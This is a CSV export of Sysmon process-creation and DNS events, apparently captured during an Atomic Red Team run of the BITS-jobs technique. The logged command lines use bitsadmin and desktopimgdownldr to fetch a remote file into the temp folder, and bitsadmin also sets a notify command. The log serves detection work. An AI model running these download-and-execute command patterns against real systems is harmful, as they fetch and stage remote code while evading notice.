Channel,CommandLine,Company,Computer,CreationUtcTime,CurrentDirectory,Description,EventID,EventRecordID,FileVersion,Hashes,Image,IntegrityLevel,Keywords,Level,LogonGuid,LogonId,Message,Opcode,OriginalFileName,ParentCommandLine,ParentImage,ParentProcessGuid,ParentProcessId,ParentUser,ProcessGuid,ProcessID,ProcessId,Product,QueryName,QueryResults,QueryStatus,RenderingInfo,RuleName,SystemTime,TargetFilename,Task,TerminalSessionId,ThreadID,User,UserID,UtcTime,Version,raw
Microsoft-Windows-Sysmon/Operational,desktopimgdownldr.exe  /lockscreenurl:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md /eventName:desktopimgdownldr,Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,desktopimgdownldr.exe,1,19594,10.0.22621.2506 (WinBuild.160101.0800),"MD5=E278D07221A44C58C86B376A8D61F5A3,SHA256=459040FEC9B0542B0D024813D0F34FFF524D6B41D736AFF3612152D20CFF82F6,IMPHASH=37D6DC6AADFD1E05E947C537F5829588",C:\Windows\System32\desktopimgdownldr.exe,Medium,0x8000000000000000,Information,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,"Process Create:

RuleName: -

UtcTime: 2023-12-27 22:18:25.561

ProcessGuid: {f57bd86a-a2b1-658c-d901-000000000f00}

ProcessId: 3840

Image: C:\Windows\System32\desktopimgdownldr.exe

FileVersion: 10.0.22621.2506 (WinBuild.160101.0800)

Description: desktopimgdownldr.exe

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: desktopimgdownldr.exe

CommandLine: desktopimgdownldr.exe  /lockscreenurl:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md /eventName:desktopimgdownldr

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=E278D07221A44C58C86B376A8D61F5A3,SHA256=459040FEC9B0542B0D024813D0F34FFF524D6B41D736AFF3612152D20CFF82F6,IMPHASH=37D6DC6AADFD1E05E947C537F5829588

ParentProcessGuid: {f57bd86a-a2b1-658c-d801-000000000f00}

ParentProcessId: 9504

ParentImage: C:\Windows\System32\cmd.exe

ParentCommandLine: cmd  /c desktopimgdownldr.exe /lockscreenurl:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md /eventName:desktopimgdownldr

ParentUser: WINDEV2309EVAL\User",Info,desktopimgdownldr.exe,cmd  /c desktopimgdownldr.exe /lockscreenurl:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md /eventName:desktopimgdownldr,C:\Windows\System32\cmd.exe,{f57bd86a-a2b1-658c-d801-000000000f00},9504,WINDEV2309EVAL\User,{f57bd86a-a2b1-658c-d901-000000000f00},3588,3840,Microsoft® Windows® Operating System,,,,"
      ",-,2023-12-27T22:18:25.5701537Z,,Process Create (rule: ProcessCreate),1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 22:18:25.561,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T22:18:25.5701537Z""/>
      <EventRecordID>19594</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 22:18:25.561</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-a2b1-658c-d901-000000000f00}</Data>
      <Data Name=""ProcessId"">3840</Data>
      <Data Name=""Image"">C:\Windows\System32\desktopimgdownldr.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.2506 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">desktopimgdownldr.exe</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">desktopimgdownldr.exe</Data>
      <Data Name=""CommandLine"">desktopimgdownldr.exe  /lockscreenurl:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md /eventName:desktopimgdownldr</Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      <Data Name=""LogonId"">0x2f87b</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=E278D07221A44C58C86B376A8D61F5A3,SHA256=459040FEC9B0542B0D024813D0F34FFF524D6B41D736AFF3612152D20CFF82F6,IMPHASH=37D6DC6AADFD1E05E947C537F5829588</Data>
      <Data Name=""ParentProcessGuid"">{f57bd86a-a2b1-658c-d801-000000000f00}</Data>
      <Data Name=""ParentProcessId"">9504</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\cmd.exe</Data>
      <Data Name=""ParentCommandLine"">cmd  /c desktopimgdownldr.exe /lockscreenurl:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md /eventName:desktopimgdownldr</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-27 22:18:25.561

ProcessGuid: {f57bd86a-a2b1-658c-d901-000000000f00}

ProcessId: 3840

Image: C:\Windows\System32\desktopimgdownldr.exe

FileVersion: 10.0.22621.2506 (WinBuild.160101.0800)

Description: desktopimgdownldr.exe

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: desktopimgdownldr.exe

CommandLine: desktopimgdownldr.exe  /lockscreenurl:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md /eventName:desktopimgdownldr

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=E278D07221A44C58C86B376A8D61F5A3,SHA256=459040FEC9B0542B0D024813D0F34FFF524D6B41D736AFF3612152D20CFF82F6,IMPHASH=37D6DC6AADFD1E05E947C537F5829588

ParentProcessGuid: {f57bd86a-a2b1-658c-d801-000000000f00}

ParentProcessId: 9504

ParentImage: C:\Windows\System32\cmd.exe

ParentCommandLine: cmd  /c desktopimgdownldr.exe /lockscreenurl:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md /eventName:desktopimgdownldr

ParentUser: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,cmd  /c desktopimgdownldr.exe /lockscreenurl:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md /eventName:desktopimgdownldr,Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Windows Command Processor,1,19593,10.0.22621.2506 (WinBuild.160101.0800),"MD5=133D568ECCB557E37BEA1459521CBAC2,SHA256=05A30592D2C3421C41121145C6EEFA7C81FEA6B42D6233A522240A8468326B9C,IMPHASH=D73E39DAB3C8B57AA408073D01254964",C:\Windows\System32\cmd.exe,Medium,0x8000000000000000,Information,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,"Process Create:

RuleName: -

UtcTime: 2023-12-27 22:18:25.532

ProcessGuid: {f57bd86a-a2b1-658c-d801-000000000f00}

ProcessId: 9504

Image: C:\Windows\System32\cmd.exe

FileVersion: 10.0.22621.2506 (WinBuild.160101.0800)

Description: Windows Command Processor

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: Cmd.Exe

CommandLine: cmd  /c desktopimgdownldr.exe /lockscreenurl:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md /eventName:desktopimgdownldr

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=133D568ECCB557E37BEA1459521CBAC2,SHA256=05A30592D2C3421C41121145C6EEFA7C81FEA6B42D6233A522240A8468326B9C,IMPHASH=D73E39DAB3C8B57AA408073D01254964

ParentProcessGuid: {f57bd86a-a2b1-658c-d601-000000000f00}

ParentProcessId: 5112

ParentImage: C:\Windows\System32\cmd.exe

ParentCommandLine: ""cmd.exe"" /c set ""SYSTEMROOT=C:\Windows\Temp"" && cmd /c desktopimgdownldr.exe /lockscreenurl:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md /eventName:desktopimgdownldr

ParentUser: WINDEV2309EVAL\User",Info,Cmd.Exe,"""cmd.exe"" /c set ""SYSTEMROOT=C:\Windows\Temp"" && cmd /c desktopimgdownldr.exe /lockscreenurl:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md /eventName:desktopimgdownldr",C:\Windows\System32\cmd.exe,{f57bd86a-a2b1-658c-d601-000000000f00},5112,WINDEV2309EVAL\User,{f57bd86a-a2b1-658c-d801-000000000f00},3588,9504,Microsoft® Windows® Operating System,,,,"
      ",-,2023-12-27T22:18:25.5333024Z,,Process Create (rule: ProcessCreate),1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 22:18:25.532,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T22:18:25.5333024Z""/>
      <EventRecordID>19593</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 22:18:25.532</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-a2b1-658c-d801-000000000f00}</Data>
      <Data Name=""ProcessId"">9504</Data>
      <Data Name=""Image"">C:\Windows\System32\cmd.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.2506 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Windows Command Processor</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">Cmd.Exe</Data>
      <Data Name=""CommandLine"">cmd  /c desktopimgdownldr.exe /lockscreenurl:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md /eventName:desktopimgdownldr</Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      <Data Name=""LogonId"">0x2f87b</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=133D568ECCB557E37BEA1459521CBAC2,SHA256=05A30592D2C3421C41121145C6EEFA7C81FEA6B42D6233A522240A8468326B9C,IMPHASH=D73E39DAB3C8B57AA408073D01254964</Data>
      <Data Name=""ParentProcessGuid"">{f57bd86a-a2b1-658c-d601-000000000f00}</Data>
      <Data Name=""ParentProcessId"">5112</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\cmd.exe</Data>
      <Data Name=""ParentCommandLine"">""cmd.exe"" /c set ""SYSTEMROOT=C:\Windows\Temp"" &amp;&amp; cmd /c desktopimgdownldr.exe /lockscreenurl:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md /eventName:desktopimgdownldr</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-27 22:18:25.532

ProcessGuid: {f57bd86a-a2b1-658c-d801-000000000f00}

ProcessId: 9504

Image: C:\Windows\System32\cmd.exe

FileVersion: 10.0.22621.2506 (WinBuild.160101.0800)

Description: Windows Command Processor

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: Cmd.Exe

CommandLine: cmd  /c desktopimgdownldr.exe /lockscreenurl:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md /eventName:desktopimgdownldr

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=133D568ECCB557E37BEA1459521CBAC2,SHA256=05A30592D2C3421C41121145C6EEFA7C81FEA6B42D6233A522240A8468326B9C,IMPHASH=D73E39DAB3C8B57AA408073D01254964

ParentProcessGuid: {f57bd86a-a2b1-658c-d601-000000000f00}

ParentProcessId: 5112

ParentImage: C:\Windows\System32\cmd.exe

ParentCommandLine: ""cmd.exe"" /c set ""SYSTEMROOT=C:\Windows\Temp"" &amp;&amp; cmd /c desktopimgdownldr.exe /lockscreenurl:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md /eventName:desktopimgdownldr

ParentUser: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"""cmd.exe"" /c set ""SYSTEMROOT=C:\Windows\Temp"" && cmd /c desktopimgdownldr.exe /lockscreenurl:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md /eventName:desktopimgdownldr",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Windows Command Processor,1,19592,10.0.22621.2506 (WinBuild.160101.0800),"MD5=133D568ECCB557E37BEA1459521CBAC2,SHA256=05A30592D2C3421C41121145C6EEFA7C81FEA6B42D6233A522240A8468326B9C,IMPHASH=D73E39DAB3C8B57AA408073D01254964",C:\Windows\System32\cmd.exe,Medium,0x8000000000000000,Information,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,"Process Create:

RuleName: -

UtcTime: 2023-12-27 22:18:25.507

ProcessGuid: {f57bd86a-a2b1-658c-d601-000000000f00}

ProcessId: 5112

Image: C:\Windows\System32\cmd.exe

FileVersion: 10.0.22621.2506 (WinBuild.160101.0800)

Description: Windows Command Processor

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: Cmd.Exe

CommandLine: ""cmd.exe"" /c set ""SYSTEMROOT=C:\Windows\Temp"" && cmd /c desktopimgdownldr.exe /lockscreenurl:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md /eventName:desktopimgdownldr

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=133D568ECCB557E37BEA1459521CBAC2,SHA256=05A30592D2C3421C41121145C6EEFA7C81FEA6B42D6233A522240A8468326B9C,IMPHASH=D73E39DAB3C8B57AA408073D01254964

ParentProcessGuid: {00000000-0000-0000-0000-000000000000}

ParentProcessId: 1688

ParentImage: -

ParentCommandLine: -

ParentUser: -",Info,Cmd.Exe,-,-,{00000000-0000-0000-0000-000000000000},1688,-,{f57bd86a-a2b1-658c-d601-000000000f00},3588,5112,Microsoft® Windows® Operating System,,,,"
      ",-,2023-12-27T22:18:25.5086269Z,,Process Create (rule: ProcessCreate),1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 22:18:25.507,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T22:18:25.5086269Z""/>
      <EventRecordID>19592</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 22:18:25.507</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-a2b1-658c-d601-000000000f00}</Data>
      <Data Name=""ProcessId"">5112</Data>
      <Data Name=""Image"">C:\Windows\System32\cmd.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.2506 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Windows Command Processor</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">Cmd.Exe</Data>
      <Data Name=""CommandLine"">""cmd.exe"" /c set ""SYSTEMROOT=C:\Windows\Temp"" &amp;&amp; cmd /c desktopimgdownldr.exe /lockscreenurl:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md /eventName:desktopimgdownldr</Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      <Data Name=""LogonId"">0x2f87b</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=133D568ECCB557E37BEA1459521CBAC2,SHA256=05A30592D2C3421C41121145C6EEFA7C81FEA6B42D6233A522240A8468326B9C,IMPHASH=D73E39DAB3C8B57AA408073D01254964</Data>
      <Data Name=""ParentProcessGuid"">{00000000-0000-0000-0000-000000000000}</Data>
      <Data Name=""ParentProcessId"">1688</Data>
      <Data Name=""ParentImage"">-</Data>
      <Data Name=""ParentCommandLine"">-</Data>
      <Data Name=""ParentUser"">-</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-27 22:18:25.507

ProcessGuid: {f57bd86a-a2b1-658c-d601-000000000f00}

ProcessId: 5112

Image: C:\Windows\System32\cmd.exe

FileVersion: 10.0.22621.2506 (WinBuild.160101.0800)

Description: Windows Command Processor

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: Cmd.Exe

CommandLine: ""cmd.exe"" /c set ""SYSTEMROOT=C:\Windows\Temp"" &amp;&amp; cmd /c desktopimgdownldr.exe /lockscreenurl:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md /eventName:desktopimgdownldr

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=133D568ECCB557E37BEA1459521CBAC2,SHA256=05A30592D2C3421C41121145C6EEFA7C81FEA6B42D6233A522240A8468326B9C,IMPHASH=D73E39DAB3C8B57AA408073D01254964

ParentProcessGuid: {00000000-0000-0000-0000-000000000000}

ParentProcessId: 1688

ParentImage: -

ParentCommandLine: -

ParentUser: -</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,bitsadmin.exe  /complete AtomicBITS,Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,BITS administration utility,1,19591,7.8.22621.1 (WinBuild.160101.0800),"MD5=C62B04C717A3CCF25D0C44BA97C2A6AA,SHA256=7C2365B752F8D2708C737BC34260D5F3D1568FDD2E12892D3CA3E4952ADD0230,IMPHASH=0CAC68DC73A62CA8C76038194D54BF79",C:\Windows\System32\bitsadmin.exe,Medium,0x8000000000000000,Information,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,"Process Create:

RuleName: -

UtcTime: 2023-12-27 22:18:25.197

ProcessGuid: {f57bd86a-a2b1-658c-d501-000000000f00}

ProcessId: 4328

Image: C:\Windows\System32\bitsadmin.exe

FileVersion: 7.8.22621.1 (WinBuild.160101.0800)

Description: BITS administration utility

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: bitsadmin.exe

CommandLine: bitsadmin.exe  /complete AtomicBITS

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=C62B04C717A3CCF25D0C44BA97C2A6AA,SHA256=7C2365B752F8D2708C737BC34260D5F3D1568FDD2E12892D3CA3E4952ADD0230,IMPHASH=0CAC68DC73A62CA8C76038194D54BF79

ParentProcessGuid: {f57bd86a-a2ac-658c-ce01-000000000f00}

ParentProcessId: 10092

ParentImage: C:\Windows\System32\cmd.exe

ParentCommandLine: ""cmd.exe"" /c bitsadmin.exe /create AtomicBITS & bitsadmin.exe /addfile AtomicBITS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md %temp%\bitsadmin3_flag.ps1 & bitsadmin.exe /setnotifycmdline AtomicBITS C:\Windows\system32\notepad.exe NULL & bitsadmin.exe /resume AtomicBITS & ping -n 5 127.0.0.1 >nul 2>&1 & bitsadmin.exe /complete AtomicBITS

ParentUser: WINDEV2309EVAL\User",Info,bitsadmin.exe,"""cmd.exe"" /c bitsadmin.exe /create AtomicBITS & bitsadmin.exe /addfile AtomicBITS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md %temp%\bitsadmin3_flag.ps1 & bitsadmin.exe /setnotifycmdline AtomicBITS C:\Windows\system32\notepad.exe NULL & bitsadmin.exe /resume AtomicBITS & ping -n 5 127.0.0.1 >nul 2>&1 & bitsadmin.exe /complete AtomicBITS",C:\Windows\System32\cmd.exe,{f57bd86a-a2ac-658c-ce01-000000000f00},10092,WINDEV2309EVAL\User,{f57bd86a-a2b1-658c-d501-000000000f00},3588,4328,Microsoft® Windows® Operating System,,,,"
      ",-,2023-12-27T22:18:25.1997939Z,,Process Create (rule: ProcessCreate),1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 22:18:25.197,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T22:18:25.1997939Z""/>
      <EventRecordID>19591</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 22:18:25.197</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-a2b1-658c-d501-000000000f00}</Data>
      <Data Name=""ProcessId"">4328</Data>
      <Data Name=""Image"">C:\Windows\System32\bitsadmin.exe</Data>
      <Data Name=""FileVersion"">7.8.22621.1 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">BITS administration utility</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">bitsadmin.exe</Data>
      <Data Name=""CommandLine"">bitsadmin.exe  /complete AtomicBITS</Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      <Data Name=""LogonId"">0x2f87b</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=C62B04C717A3CCF25D0C44BA97C2A6AA,SHA256=7C2365B752F8D2708C737BC34260D5F3D1568FDD2E12892D3CA3E4952ADD0230,IMPHASH=0CAC68DC73A62CA8C76038194D54BF79</Data>
      <Data Name=""ParentProcessGuid"">{f57bd86a-a2ac-658c-ce01-000000000f00}</Data>
      <Data Name=""ParentProcessId"">10092</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\cmd.exe</Data>
      <Data Name=""ParentCommandLine"">""cmd.exe"" /c bitsadmin.exe /create AtomicBITS &amp; bitsadmin.exe /addfile AtomicBITS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md %temp%\bitsadmin3_flag.ps1 &amp; bitsadmin.exe /setnotifycmdline AtomicBITS C:\Windows\system32\notepad.exe NULL &amp; bitsadmin.exe /resume AtomicBITS &amp; ping -n 5 127.0.0.1 &gt;nul 2&gt;&amp;1 &amp; bitsadmin.exe /complete AtomicBITS</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-27 22:18:25.197

ProcessGuid: {f57bd86a-a2b1-658c-d501-000000000f00}

ProcessId: 4328

Image: C:\Windows\System32\bitsadmin.exe

FileVersion: 7.8.22621.1 (WinBuild.160101.0800)

Description: BITS administration utility

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: bitsadmin.exe

CommandLine: bitsadmin.exe  /complete AtomicBITS

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=C62B04C717A3CCF25D0C44BA97C2A6AA,SHA256=7C2365B752F8D2708C737BC34260D5F3D1568FDD2E12892D3CA3E4952ADD0230,IMPHASH=0CAC68DC73A62CA8C76038194D54BF79

ParentProcessGuid: {f57bd86a-a2ac-658c-ce01-000000000f00}

ParentProcessId: 10092

ParentImage: C:\Windows\System32\cmd.exe

ParentCommandLine: ""cmd.exe"" /c bitsadmin.exe /create AtomicBITS &amp; bitsadmin.exe /addfile AtomicBITS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md %temp%\bitsadmin3_flag.ps1 &amp; bitsadmin.exe /setnotifycmdline AtomicBITS C:\Windows\system32\notepad.exe NULL &amp; bitsadmin.exe /resume AtomicBITS &amp; ping -n 5 127.0.0.1 &gt;nul 2&gt;&amp;1 &amp; bitsadmin.exe /complete AtomicBITS

ParentUser: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,,,,22,19590,,,C:\Windows\System32\svchost.exe,,0x8000000000000000,Information,,,"Dns query:

RuleName: -

UtcTime: 2023-12-27 14:54:04.817

ProcessGuid: {f57bd86a-4451-658c-6d01-000000000f00}

ProcessId: 4136

QueryName: raw.githubusercontent.com

QueryStatus: 0

QueryResults: ::ffff:185.199.108.133;::ffff:185.199.109.133;::ffff:185.199.111.133;::ffff:185.199.110.133;

Image: C:\Windows\System32\svchost.exe

User: NT AUTHORITY\SYSTEM",Info,,,,,,,{f57bd86a-4451-658c-6d01-000000000f00},3588,4136,,raw.githubusercontent.com,::ffff:185.199.108.133;::ffff:185.199.109.133;::ffff:185.199.111.133;::ffff:185.199.110.133;,0,"
